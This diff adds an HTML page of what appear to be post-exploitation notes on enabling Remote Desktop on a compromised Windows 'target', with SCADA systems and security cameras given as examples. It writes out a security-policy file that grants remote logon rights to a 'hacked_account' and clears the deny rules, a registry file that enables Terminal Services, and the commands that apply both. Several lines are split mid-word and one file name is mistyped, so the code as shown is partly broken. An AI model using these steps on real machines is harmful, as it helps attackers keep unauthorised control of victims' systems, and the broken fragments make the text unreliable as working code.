@@ -1,0 +1,55 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Enable RDP Remotely</title>
+</head><body>Enabling RDP remotely<br/>
+&nbsp;&#09;Having a GUI to your target can be necessary<br/>
+&nbsp;&#09;Maybe they are running &nbsp;a specialized GUI app<br/>
+&nbsp;&#09;&#09;SCADA systems<br/>
+&nbsp;&#09;&#09;Security cameras<br/>
+&nbsp;<br/>
+Feature Modification<br/>
+&nbsp;&#09;Complicated procedure, especially if GPO's involved<br/>
+&nbsp;&#09;Create a file named fix_ts_policy.ini<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">[Unicode]</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">Unicode=yes</li>
+<li style="list-style-type: none">[Version]</li>
+<li style="list-style-type: none">signature="$CHICAGO$"</li>
+<li style="list-style-type: none">Revision=1</li>
+<li style="list-style-type: none">[Privilege Rights]</li>
+<li style="list-style-type: none">[Privilege</li>
+<li style="list-style-type: none">Rights]</li>
+<li style="list-style-type: none">seremoteinteractivelogonright = hacked_account</li>
+<li style="list-style-type: none">seinteractivelogonright = hacked_account</li>
+<li style="list-style-type: none">sedenyinteractivelogonright =</li>
+<li style="list-style-type: none">sedenyremoteinteractivelogonright =</li>
+<li style="list-style-type: none">sedenynetworklogonright =</li>
+</ul>
+</li>
+</ul>
+</li>
+<li style="list-style-type: none">This file will fix policy settings in your way</li>
+<li style="list-style-type: none">Change "hacked_account" to a real account</li>
+</ul>
+<br/>
+Continued<br/>
+&nbsp;&#09;Create another file named enable_ts.reg<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">Windows Registry Editor Version 5.00</li>
+<li style="list-style-type: none">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentCont</li>
+<li style="list-style-type: none">rolSet\Control\T</li>
+<li style="list-style-type: none">erminal Server]</li>
+<li style="list-style-type: none">"fDenyTSConnection</li>
+<li style="list-style-type: none">s"=dword:00000000</li>
+<li style="list-style-type: none">"TSEnabled"=dword:00000001</li>
+<li style="list-style-type: none">"TSUserEnabled"=dword:00000000</li>
+</ul>
+</li>
+</ul>
+<br/>
+Then perform these commands<br/>
+sc config termservice start= auto<br/>
+regedit /s enable_ts.reg<br/>
+copy c:\windows\security\database\secedit.sdb c:\windows\security\database\new.secedit.sdb<br/>
+copy c:\windows\security\database\secedit.sdb c:\windows\security\database\orig.secedit.sdb<br/>
+secedit /configure /db new.secedit.sdb /cfg fix ts policy.ini<br/>
+gpupdate /Force<br/>
+net start "terminal services"</body></html>
